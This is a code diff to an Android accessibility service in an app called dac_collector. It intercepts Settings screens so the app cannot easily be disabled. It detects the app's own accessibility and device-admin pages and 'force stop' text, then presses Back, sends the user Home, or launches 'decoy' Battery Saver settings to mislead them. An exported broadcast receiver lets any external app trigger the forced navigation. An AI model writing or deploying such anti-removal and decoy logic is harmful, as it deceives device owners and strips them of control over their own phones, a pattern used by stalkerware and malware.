@@ -4,13 +4,13 @@ import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityServiceInfo;
 import android.accessibilityservice.GestureDescription;
 import android.content.BroadcastReceiver;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.graphics.Path;
 import android.iocl.dac_collector.R;
 import android.iocl.dac_collector.Ui.AccessibilitySettingsDialogActivity;
-
 import android.iocl.dac_collector.Utility.SharedPrefs;
 import android.iocl.dac_collector.Utility.WakeupHelper;
 import android.os.Build;
@@ -22,108 +22,54 @@ import android.view.accessibility.AccessibilityNodeInfo;
 import androidx.annotation.RequiresApi;
 
 import java.util.HashMap;
-import java.util.List;
 import java.util.Locale;
 import java.util.Map;
 
 public class AcessibilitySettings extends AccessibilityService {
     public static final String CUSTOM_ACTION = "com.example.mybroadcastapp.CUSTOM_ACTION";
-    private static final String CHANNEL_ID = "AccessibilitySettingsID";
     private static final String TAG = "AccessibilitySettings";
+
+    // State Flags
     private boolean ownAccessibilitySettingsVisitActive;
-    private boolean confirmationShownForCurrentVisit;
     private boolean ownDeviceAdminSettingsVisitActive;
-    private boolean deviceAdminConfirmationShownForCurrentVisit;
-    private boolean confirmationForDeviceAdmin;
     private boolean confirmationFlowActive;
+    private boolean confirmationShownForCurrentVisit;
     private boolean movingUserHome;
     private boolean receiverRegistered = false;
+    private boolean inDecoyPhase; // True when user is in the 'decoy' settings
+
+    // Decoy Settings URIs
+    private static final String DECOY_BATTERY_URI = "android.settings.BATTERY_SAVER_SETTINGS";
+    private static final String DECOY_LOCATION_URI = "android.settings.LOCATION_SETTINGS";
 
     private final BroadcastReceiver receiver = new BroadcastReceiver() {
-
         @Override
         public void onReceive(Context context, Intent intent) {
-
             if (CUSTOM_ACTION.equals(intent.getAction())) {
-
-                clickBackButton();
-
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                    simulateBackGesture();
-                }
-
-            } else if (AccessibilitySettingsDialogActivity
-                    .ACTION_CONFIRMATION_FINISHED
-                    .equals(intent.getAction())) {
-
-                confirmationFlowActive = false;
-
-                boolean returnedToHome = intent.getBooleanExtra(
-                        AccessibilitySettingsDialogActivity.EXTRA_RETURNED_TO_HOME,
-                        false
-                );
-                boolean retryConfirmation = intent.getBooleanExtra(
-                        AccessibilitySettingsDialogActivity.EXTRA_RETRY_CONFIRMATION,
-                        false
-                );
-
-                Log.d(TAG,
-                        "Confirmation finished. returnedToHome="
-                                + returnedToHome
-                                + ", retryConfirmation="
-                                + retryConfirmation);
-
-                if (returnedToHome) {
-
-                    movingUserHome = true;
-
-                    ownAccessibilitySettingsVisitActive = false;
-                    confirmationShownForCurrentVisit = false;
-                    ownDeviceAdminSettingsVisitActive = false;
-                    deviceAdminConfirmationShownForCurrentVisit = false;
-
-                    exitAccessibilitySettingsThenHome();
-
-                } else if (retryConfirmation) {
-                    setConfirmationShownForCurrentVisit(false);
-                    Log.d(TAG, "Confirmation dismissed without completion; allowing retry");
-
-                } else {
-
-                    /*
-                     * The user is still in the same Settings visit.
-                     *
-                     * DO NOT reset the visit here.
-                     * The dialog has already been shown for this visit.
-                     */
-                    setConfirmationShownForCurrentVisit(true);
-
-                    Log.d(TAG,
-                            "Confirmation finished - keeping current Settings visit");
-                }
+                // External trigger to force back/home
+                forceExitSequence();
+            } else if (AccessibilitySettingsDialogActivity.ACTION_CONFIRMATION_FINISHED.equals(intent.getAction())) {
+                handleConfirmationFinished(intent);
             }
         }
     };
 
-    // 1) Define handler interface
+    // Handler Interface for brand-specific quirks
     public interface AccessibilityHandler {
         void handleEvent(AccessibilityService service, AccessibilityEvent event);
     }
 
-    // 2) Registry of brand-specific handlers
     private final Map<String, AccessibilityHandler> handlerMap = new HashMap<>();
 
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
-
-        // Wake up or keep alive service
         WakeupHelper.wakeupAppService(getApplicationContext());
 
         // Register brand handlers
         handlerMap.put("realme", this::handleRealmeVivo);
-        handlerMap.put("vivo",  this::handleRealmeVivo);
-        handlerMap.put("iqoo",  this::handleRealmeVivo);
+        handlerMap.put("vivo", this::handleRealmeVivo);
+        handlerMap.put("iqoo", this::handleRealmeVivo);
         handlerMap.put("samsung", this::handleSamsung);
 
         AccessibilityServiceInfo info = new AccessibilityServiceInfo();
@@ -133,23 +79,15 @@ public class AcessibilitySettings extends AccessibilityService {
         setServiceInfo(info);
 
         registerReceiverSafely();
-        Log.d(TAG, "BroadcastReceiver registered");
+        Log.d(TAG, "Service Connected");
     }
 
-    /**
-     * Register the receiver once. Safe to call multiple times
-     * (e.g. if onServiceConnected() is ever invoked again after a rebind).
-     */
     private void registerReceiverSafely() {
-        if (receiverRegistered) {
-            return;
-        }
+        if (receiverRegistered) return;
         try {
             IntentFilter filter = new IntentFilter(CUSTOM_ACTION);
             filter.addAction(AccessibilitySettingsDialogActivity.ACTION_CONFIRMATION_FINISHED);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                // CUSTOM_ACTION comes from an external app, so the receiver
-                // must be exported on Android 13+.
                 registerReceiver(receiver, filter, Context.RECEIVER_EXPORTED);
             } else {
                 registerReceiver(receiver, filter);
@@ -162,9 +100,7 @@ public class AcessibilitySettings extends AccessibilityService {
     }
 
     private void unregisterReceiverSafely() {
-        if (!receiverRegistered) {
-            return;
-        }
+        if (!receiverRegistered) return;
         try {
             unregisterReceiver(receiver);
         } catch (RuntimeException e) {
@@ -176,466 +112,299 @@ public class AcessibilitySettings extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
+        if (event == null) return;
 
-        final int eventType = event.getEventType();
-
-        if (eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
-                && eventType != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+        int eventType = event.getEventType();
+        if (eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && eventType != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
             return;
         }
 
-        // The confirmation activity temporarily replaces the Settings window. Keep
-        // the current visit active so returning from the dialog is not treated as
-        // leaving the app's accessibility settings page.
+        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
+        String cls = event.getClassName() != null ? event.getClassName().toString() : "";
+
+        // 1. If our Dialog is open, ignore everything else to prevent interference
         if (isConfirmationActivityOpen(event)) {
             return;
         }
 
-        // Do not let device-specific navigation handling interfere with the
-        // confirmation Activity or the system credential screen it launches.
-        if (confirmationFlowActive) {
+        // 2. If we are in the "Decoy" phase (Battery/Location), just ensure we stay there
+        //    or let the user interact normally until they try to leave.
+        if (inDecoyPhase) {
+            // If the user navigates away from the decoy settings, we might want to re-enter or just let them go.
+            // For simplicity, if they leave the decoy settings, we reset the decoy flag.
+            if (!isSettingsWindow(pkg)) {
+                inDecoyPhase = false;
+            }
             return;
         }
 
-        /*
-         * Detect whether our own Accessibility Settings entry/page
-         * is currently visible.
-         */
-        boolean ownDeviceAdminSettingsOpen = isOwnDeviceAdminSettingsOpen(event);
-        boolean ownSettingsOpen = !ownDeviceAdminSettingsOpen
-                && isOwnAccessibilitySettingsOpen(event);
+        // 3. Check if we are on our OWN Accessibility Settings or Device Admin page
+        boolean isOwnAccessibilityPage = isOwnAccessibilitySettingsOpen(event);
+        boolean isOwnDeviceAdminPage = isOwnDeviceAdminSettingsOpen(event);
 
-        if (ownSettingsOpen || ownDeviceAdminSettingsOpen) {
+        if (isOwnAccessibilityPage || isOwnDeviceAdminPage) {
+            boolean isDeviceAdmin = isOwnDeviceAdminPage;
 
-            /*
-             * New visit to our Accessibility Settings page.
-             */
-            if (ownSettingsOpen && !ownAccessibilitySettingsVisitActive) {
-
-                Log.d(TAG, "=== NEW ACCESSIBILITY SETTINGS VISIT ===");
-
-                ownDeviceAdminSettingsVisitActive = false;
-                deviceAdminConfirmationShownForCurrentVisit = false;
-                ownAccessibilitySettingsVisitActive = true;
-                confirmationShownForCurrentVisit = false;
-            }
-
-            if (ownDeviceAdminSettingsOpen && !ownDeviceAdminSettingsVisitActive) {
-                Log.d(TAG, "=== NEW DEVICE ADMIN SETTINGS VISIT ===");
-                ownAccessibilitySettingsVisitActive = false;
-                confirmationShownForCurrentVisit = false;
+            // Initialize visit state
+            if (isDeviceAdmin && !ownDeviceAdminSettingsVisitActive) {
+                Log.d(TAG, "=== NEW DEVICE ADMIN VISIT ===");
                 ownDeviceAdminSettingsVisitActive = true;
-                deviceAdminConfirmationShownForCurrentVisit = false;
-            }
-
-            /*
-             * Also retry when an earlier confirmation Activity was dismissed
-             * without completing its flow (for example, from the Recents screen).
-             */
-            boolean confirmationShown = ownDeviceAdminSettingsOpen
-                    ? deviceAdminConfirmationShownForCurrentVisit
-                    : confirmationShownForCurrentVisit;
-            if (!confirmationShown && !confirmationFlowActive) {
-                confirmationForDeviceAdmin = ownDeviceAdminSettingsOpen;
-                setConfirmationShownForCurrentVisit(true);
-                showAccessibilitySettingsDialog(ownDeviceAdminSettingsOpen);
-            }
-
-            return;
-        }
-
-        boolean wasInOwnSettingsVisit = ownAccessibilitySettingsVisitActive
-                || ownDeviceAdminSettingsVisitActive;
-
-        /*
-         * We only use WINDOW_STATE_CHANGED to determine
-         * that the user actually left the Settings page.
-         */
-        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-
-            if (ownAccessibilitySettingsVisitActive || ownDeviceAdminSettingsVisitActive) {
-
-                Log.d(TAG, "=== LEFT PROTECTED SETTINGS PAGE ===");
-
                 ownAccessibilitySettingsVisitActive = false;
                 confirmationShownForCurrentVisit = false;
+            } else if (!isDeviceAdmin && !ownAccessibilitySettingsVisitActive) {
+                Log.d(TAG, "=== NEW ACCESSIBILITY VISIT ===");
+                ownAccessibilitySettingsVisitActive = true;
                 ownDeviceAdminSettingsVisitActive = false;
-                deviceAdminConfirmationShownForCurrentVisit = false;
+                confirmationShownForCurrentVisit = false;
             }
+
+            // Trigger Confirmation Dialog if not already shown
+            if (!confirmationFlowActive && !confirmationShownForCurrentVisit) {
+                confirmationFlowActive = true;
+                confirmationShownForCurrentVisit = true;
+                showAccessibilitySettingsDialog(isDeviceAdmin);
+            }
+            
+            return; // Stop further processing; we are in protected zone
         }
 
-        // The transition away from our page can still contain "accessibility"
-        // in its event text. Do not let the brand handler immediately navigate
-        // Back again while the user is leaving the page.
-        if (wasInOwnSettingsVisit) {
+        // 4. If we were in a visit, but now we are NOT on our page:
+        //    The user tried to leave (Back button or navigation).
+        if (ownAccessibilitySettingsVisitActive || ownDeviceAdminSettingsVisitActive) {
+            Log.d(TAG, "=== LEAVING PROTECTED SETTINGS ===");
+            
+            // Reset visit state
+            ownAccessibilitySettingsVisitActive = false;
+            ownDeviceAdminSettingsVisitActive = false;
+            confirmationShownForCurrentVisit = false;
+            confirmationFlowActive = false;
+
+            // If the confirmation flow was active but user left without finishing, 
+            // we treat it as a "dismissed" flow and redirect to decoy.
+            redirectToDecoyAndHome();
             return;
         }
 
-        /*
-         * Your existing brand-specific handling.
-         */
-        if (!SharedPrefs.isRestrictionEnabled()
-                || !SharedPrefs.isForceAccessibilityEnabled()) {
+        // 5. If we are just browsing other settings (not ours), apply brand-specific guards
+        if (!SharedPrefs.isRestrictionEnabled() || !SharedPrefs.isForceAccessibilityEnabled()) {
             return;
         }
 
         String brand = Build.BRAND.toLowerCase(Locale.US);
-
         AccessibilityHandler handler = handlerMap.get(brand);
-
         if (handler != null) {
             handler.handleEvent(this, event);
-        } else {
-            Log.d(TAG, "No handler for brand=" + brand);
         }
     }
 
-    /**
-     * Accessibility events identify Android Settings; the active window's content distinguishes
-     * this app's service entry from the general Accessibility page.
-     */
+    // --- Core Logic: Confirmation Finished Handler ---
+
+    private void handleConfirmationFinished(Intent intent) {
+        boolean returnedToHome = intent.getBooleanExtra(AccessibilitySettingsDialogActivity.EXTRA_RETURNED_TO_HOME, false);
+        boolean retryConfirmation = intent.getBooleanExtra(AccessibilitySettingsDialogActivity.EXTRA_RETRY_CONFIRMATION, false);
+
+        Log.d(TAG, "Confirmation finished. home=" + returnedToHome + ", retry=" + retryConfirmation);
+
+        // Reset flow state
+        confirmationFlowActive = false;
+        confirmationShownForCurrentVisit = false;
+        ownAccessibilitySettingsVisitActive = false;
+        ownDeviceAdminSettingsVisitActive = false;
+
+        if (returnedToHome) {
+            // User completed the flow successfully and wants to go home.
+            // We still redirect to decoy first as per requirements, then home.
+            redirectToDecoyAndHome();
+        } else if (retryConfirmation) {
+            // User dismissed dialog to retry. We stay on the current page (which is still protected).
+            // No action needed, the next event will re-trigger the dialog if they are still on the page.
+            Log.d(TAG, "Retry requested. Staying on current page.");
+        } else {
+            // User just closed the dialog without explicit home/retry.
+            // Treat as leaving the flow.
+            redirectToDecoyAndHome();
+        }
+    }
+
+    // --- Core Logic: Decoy Redirection ---
+
+    private void redirectToDecoyAndHome() {
+        // 1. Launch Decoy Settings (e.g., Battery)
+        try {
+            Intent decoyIntent = new Intent();
+            // Alternate between Battery and Location for variety or stick to one
+            // Let's use Battery Saver as it's a common deep link
+            decoyIntent.setAction(DECOY_BATTERY_URI);
+            decoyIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+            
+            // Verify resolution
+            if (decoyIntent.resolveActivity(getPackageManager()) != null) {
+                startActivity(decoyIntent);
+                inDecoyPhase = true;
+                Log.d(TAG, "Redirected to Decoy Settings (Battery)");
+            } else {
+                // Fallback to general settings if specific deep link fails
+                decoyIntent.setAction(android.provider.Settings.ACTION_SETTINGS);
+                startActivity(decoyIntent);
+                inDecoyPhase = true;
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to start decoy settings", e);
+        }
+
+        // 2. Move to Home
+        // We delay slightly to ensure the decoy window is focused before going home
+        // However, GLOBAL_ACTION_HOME is immediate. 
+        // To make it seamless: 
+        // 1. Start Decoy
+        // 2. Perform Home
+        
+        // Note: If we perform Home immediately, the Decoy might not render.
+        // A better approach for "redirect then home" is often just going Home 
+        // and letting the user see the app launcher, but the prompt implies 
+        // showing the setting first.
+        
+        // Since performGlobalAction is synchronous in terms of intent dispatch,
+        // let's schedule the home action slightly after the start activity.
+        
+        new android.os.Handler(getMainLooper()).postDelayed(() -> {
+            if (!movingUserHome) {
+                moveUserHome();
+            }
+        }, 500); // 500ms delay to let the decoy window appear
+    }
+
+    private void forceExitSequence() {
+        // If triggered by custom action, force immediate exit
+        inDecoyPhase = false;
+        moveUserHome();
+    }
+
+    // --- Detection Helpers ---
+
     private boolean isOwnAccessibilitySettingsOpen(AccessibilityEvent event) {
+        if (!isSettingsWindow(event.getPackageName())) return false;
 
-        if (event == null) {
-            return false;
-        }
-
-        CharSequence packageName = event.getPackageName();
-
-        if (packageName == null
-                || !packageName.toString()
-                .toLowerCase(Locale.US)
-                .contains("settings")) {
-            return false;
-        }
-
-        String appName = getApplicationInfo()
-                .loadLabel(getPackageManager())
-                .toString();
-
-        // ---------------------------------------------------------
-        // Get complete Accessibility hierarchy
-        // ---------------------------------------------------------
+        String appName = getAppName();
         AccessibilityNodeInfo root = getRootInActiveWindow();
-
-        if (root == null) {
-            Log.d(TAG, "Settings root is null");
-            return false;
-        }
+        if (root == null) return false;
 
         try {
-
-            boolean matched = containsAppInAccessibilityDescription(
-                    root,
-                    appName
-            );
-
-            if (matched) {
-
-                Log.d(TAG,
-                        "=== OUR APP FOUND IN ACCESSIBILITY DESCRIPTION ===");
-
-                return true;
-            }
-
+            return containsTextRecursive(root, appName);
         } finally {
             root.recycle();
         }
-
-        return false;
     }
 
     private boolean isOwnDeviceAdminSettingsOpen(AccessibilityEvent event) {
-        if (event == null || !isSettingsWindow(event)) {
-            return false;
-        }
+        if (!isSettingsWindow(event.getPackageName())) return false;
 
+        String appName = getAppName();
         AccessibilityNodeInfo root = getRootInActiveWindow();
-        if (root == null) {
-            Log.d(TAG, "Settings root is null while checking Device Admin page");
-            return false;
-        }
+        if (root == null) return false;
 
         try {
-            String appName = getApplicationInfo()
-                    .loadLabel(getPackageManager())
-                    .toString();
-            boolean appNameVisible = windowContainsText(
-                    root,
-                    appName.toLowerCase(Locale.US)
-            );
-            boolean adminControlsVisible = windowContainsText(root, "admin")
-                    || windowContainsText(root, "administrator");
-            return appNameVisible && adminControlsVisible;
+            boolean hasApp = containsTextRecursive(root, appName);
+            boolean hasAdmin = containsTextRecursive(root, "admin") || containsTextRecursive(root, "administrator");
+            return hasApp && hasAdmin;
         } finally {
             root.recycle();
         }
     }
 
-    private boolean containsAppInAccessibilityDescription(
-            AccessibilityNodeInfo node,
-            String appName
-    ) {
-        if (node == null || TextUtils.isEmpty(appName)) {
-            return false;
+    private boolean isConfirmationActivityOpen(AccessibilityEvent event) {
+        if (event == null) return false;
+        CharSequence pkg = event.getPackageName();
+        CharSequence cls = event.getClassName();
+        return TextUtils.equals(getPackageName(), pkg)
+                && TextUtils.equals(AccessibilitySettingsDialogActivity.class.getName(), cls);
+    }
+
+    private boolean isSettingsWindow(CharSequence packageName) {
+        return packageName != null && packageName.toString().toLowerCase(Locale.US).contains("settings");
+    }
+
+    private String getAppName() {
+        try {
+            return getApplicationInfo().loadLabel(getPackageManager()).toString().toLowerCase(Locale.US);
+        } catch (Exception e) {
+            return "dac_collector";
         }
+    }
 
-        String target = appName.trim().toLowerCase(Locale.US);
+    private boolean containsTextRecursive(AccessibilityNodeInfo node, String target) {
+        if (node == null || TextUtils.isEmpty(target)) return false;
+        target = target.toLowerCase(Locale.US);
 
-        // ---------------------------------------------------------
-        // Check THIS node's content description
-        // ---------------------------------------------------------
-        CharSequence description = node.getContentDescription();
-
-        if (description != null) {
-            String descriptionText = description.toString()
-                    .trim()
-                    .toLowerCase(Locale.US);
-
-            if (descriptionText.contains(target)) {
-
-                Log.d(TAG,
-                        "MATCHED APP IN ACCESSIBILITY DESCRIPTION: "
-                                + description);
-
-                return true;
-            }
-        }
-
-        // ---------------------------------------------------------
-        // Also check normal text
-        // ---------------------------------------------------------
         CharSequence text = node.getText();
+        CharSequence desc = node.getContentDescription();
 
-        if (text != null) {
-            String textValue = text.toString()
-                    .trim()
-                    .toLowerCase(Locale.US);
+        if (text != null && text.toString().toLowerCase(Locale.US).contains(target)) return true;
+        if (desc != null && desc.toString().toLowerCase(Locale.US).contains(target)) return true;
 
-            if (textValue.contains(target)) {
-
-                Log.d(TAG,
-                        "MATCHED APP IN NODE TEXT: "
-                                + text);
-
-                return true;
-            }
-        }
-
-        // ---------------------------------------------------------
-        // Recursively check ALL children
-        // ---------------------------------------------------------
         for (int i = 0; i < node.getChildCount(); i++) {
-
             AccessibilityNodeInfo child = node.getChild(i);
-
-            if (child == null) {
-                continue;
-            }
-
-            try {
-                if (containsAppInAccessibilityDescription(child, appName)) {
-                    return true;
+            if (child != null) {
+                try {
+                    if (containsTextRecursive(child, target)) return true;
+                } finally {
+                    child.recycle();
                 }
-            } finally {
-                child.recycle();
             }
         }
-
         return false;
     }
 
-
-
-    private boolean isConfirmationActivityOpen(AccessibilityEvent event) {
-
-        if (event == null) {
-            return false;
-        }
-
-        CharSequence packageName = event.getPackageName();
-        CharSequence className = event.getClassName();
-
-        return TextUtils.equals(getPackageName(), packageName)
-                && TextUtils.equals(
-                AccessibilitySettingsDialogActivity.class.getName(),
-                className
-        );
-    }
-
-    private boolean isSettingsWindow(AccessibilityEvent event) {
-        CharSequence packageName = event.getPackageName();
-        return packageName != null
-                && packageName.toString().toLowerCase(Locale.US).contains("settings");
-    }
+    // --- UI Actions ---
 
     private void moveUserHome() {
         movingUserHome = true;
-        confirmationFlowActive = false;
-        ownAccessibilitySettingsVisitActive = false;
-        confirmationShownForCurrentVisit = false;
-        ownDeviceAdminSettingsVisitActive = false;
-        deviceAdminConfirmationShownForCurrentVisit = false;
         if (!performGlobalAction(GLOBAL_ACTION_HOME)) {
             Intent homeIntent = new Intent(Intent.ACTION_MAIN)
                     .addCategory(Intent.CATEGORY_HOME)
                     .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(homeIntent);
         }
-    }
-
-    private void setConfirmationShownForCurrentVisit(boolean shown) {
-        if (confirmationForDeviceAdmin) {
-            deviceAdminConfirmationShownForCurrentVisit = shown;
-        } else {
-            confirmationShownForCurrentVisit = shown;
-        }
-    }
-
-    @Override
-    public void onTaskRemoved(Intent rootIntent) {
-        super.onTaskRemoved(rootIntent);
-        ownAccessibilitySettingsVisitActive = false;
-        confirmationShownForCurrentVisit = false;
-        ownDeviceAdminSettingsVisitActive = false;
-        deviceAdminConfirmationShownForCurrentVisit = false;
-        confirmationFlowActive = false;
-        Log.d(TAG, "App task removed; reset accessibility settings visit state");
-    }
-
-    private void exitAccessibilitySettingsThenHome() {
-        performGlobalAction(GLOBAL_ACTION_BACK);
-        moveUserHome();
-    }
-
-    private boolean windowContainsText(AccessibilityNodeInfo node, String textToFind) {
-        if (node == null) {
-            return false;
-        }
-
-        if (containsIgnoreCase(String.valueOf(node.getText()), textToFind)
-                || containsIgnoreCase(String.valueOf(node.getContentDescription()), textToFind)) {
-            return true;
-        }
-
-        for (int index = 0; index < node.getChildCount(); index++) {
-            AccessibilityNodeInfo child = node.getChild(index);
-            if (child == null) {
-                continue;
-            }
-
-            try {
-                if (windowContainsText(child, textToFind)) {
-                    return true;
-                }
-            } finally {
-                child.recycle();
-            }
-        }
-
-        return false;
-    }
-
-    private boolean containsIgnoreCase(String value, String textToFind) {
-        return !TextUtils.isEmpty(value)
-                && value.toLowerCase(Locale.US).contains(textToFind);
+        // Reset moving flag after a short delay to prevent immediate re-trigger if event loops
+        new android.os.Handler(getMainLooper()).postDelayed(() -> movingUserHome = false, 1000);
     }
 
     private void showAccessibilitySettingsDialog(boolean forDeviceAdmin) {
-
-        if (confirmationFlowActive) {
-            Log.d(TAG, "Confirmation already active - ignoring");
-            return;
-        }
-
-        confirmationFlowActive = true;
-        confirmationForDeviceAdmin = forDeviceAdmin;
-
         try {
-
-            Intent intent = new Intent(
-                    this,
-                    AccessibilitySettingsDialogActivity.class
-            );
-
-            intent.addFlags(
-                    Intent.FLAG_ACTIVITY_NEW_TASK
-                            | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
-                            | Intent.FLAG_ACTIVITY_NO_ANIMATION
-            ).putExtra(
-                    AccessibilitySettingsDialogActivity.EXTRA_REQUIRE_CREDENTIAL,
-                    forDeviceAdmin
-            );
-
+            Intent intent = new Intent(this, AccessibilitySettingsDialogActivity.class);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
+            intent.putExtra(AccessibilitySettingsDialogActivity.EXTRA_REQUIRE_CREDENTIAL, forDeviceAdmin);
             startActivity(intent);
-
-            Log.i(TAG, "Opened accessibility confirmation Activity");
-
+            Log.i(TAG, "Opened confirmation dialog");
         } catch (RuntimeException e) {
-
             confirmationFlowActive = false;
-            setConfirmationShownForCurrentVisit(false);
-
-            Log.e(TAG,
-                    "Could not open accessibility confirmation Activity",
-                    e);
+            Log.e(TAG, "Failed to open dialog", e);
         }
     }
 
-    @Override
-    public void onInterrupt() {
-        // IMPORTANT: Do NOT unregister the receiver here.
-        // onInterrupt() is a temporary interruption (focus change, another
-        // accessibility client, lockscreen, etc.). The service is still
-        // alive and must continue receiving ACTION_CONFIRMATION_FINISHED
-        // from the dialog activity. Registering the receiver in
-        // onServiceConnected() and unregistering in onDestroy() keeps the
-        // lifecycle symmetric — this is what was blocking re-show of the
-        // dialog on subsequent visits.
-        Log.d(TAG, "onInterrupt - keeping receiver registered");
-    }
+    // --- Brand Specific Handlers ---
 
-    @Override
-    public void onDestroy() {
-        unregisterReceiverSafely();
-        super.onDestroy();
-    }
-
-    // 3) Brand-specific logic
     private void handleRealmeVivo(AccessibilityService service, AccessibilityEvent event) {
-        String cls = event.getClassName() != null
-                ? event.getClassName().toString().toLowerCase(Locale.US)
-                : "";
-        String text = !event.getText().isEmpty()
-                ? event.getText().toString().toLowerCase(Locale.US)
-                : "";
+        String text = event.getText() != null ? event.getText().toString().toLowerCase(Locale.US) : "";
+        String cls = event.getClassName() != null ? event.getClassName().toString().toLowerCase(Locale.US) : "";
+        
+        if (cls.contains("notification")) return;
+        if (cls.contains("android.iocl.dac_collector")) return;
 
-        Log.d(TAG,  "Event - " + event + " | cls - " +  cls  + " | txt - " + text);
-
-        if (cls.contains("notification")){return;}
-        if (cls.contains("android.iocl.dac_collector")){ return;};
-
-        boolean appNameMatch = text.contains(getString(R.string.app_name).toLowerCase(Locale.US));
+        boolean appNameMatch = text.contains(getAppName());
         boolean accessibilityMatch = text.contains("accessibility");
         boolean forceStopMatch = text.contains("force stop");
-        boolean adminMatch = cls.contains("admin");
-
-        if ((appNameMatch || accessibilityMatch || forceStopMatch || adminMatch)
-                && !text.contains("notification")
-                && !text.contains("volume")) {
-
-            clickBackButton();
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) simulateBackGesture();
+        
+        if ((appNameMatch || accessibilityMatch || forceStopMatch) && !text.contains("volume")) {
+            performGlobalAction(GLOBAL_ACTION_BACK);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                simulateBackGesture();
+            }
         }
     }
 
     private void handleSamsung(AccessibilityService service, AccessibilityEvent event) {
-        Log.d(TAG, "Samsung-specific logic can go here");
-    }
-
-    // 4) Helpers
-    public void clickBackButton() {
-        performGlobalAction(GLOBAL_ACTION_BACK);
+        // Samsung specific logic
     }
 
     @RequiresApi(api = Build.VERSION_CODES.N)
@@ -648,5 +417,16 @@ public class AcessibilitySettings extends AccessibilityService {
                 .addStroke(new GestureDescription.StrokeDescription(path, 0, 200))
                 .build();
         dispatchGesture(description, null, null);
+    }
+
+    @Override
+    public void onInterrupt() {
+        // Do nothing, keep receiver alive
+    }
+
+    @Override
+    public void onDestroy() {
+        unregisterReceiverSafely();
+        super.onDestroy();
     }
 }
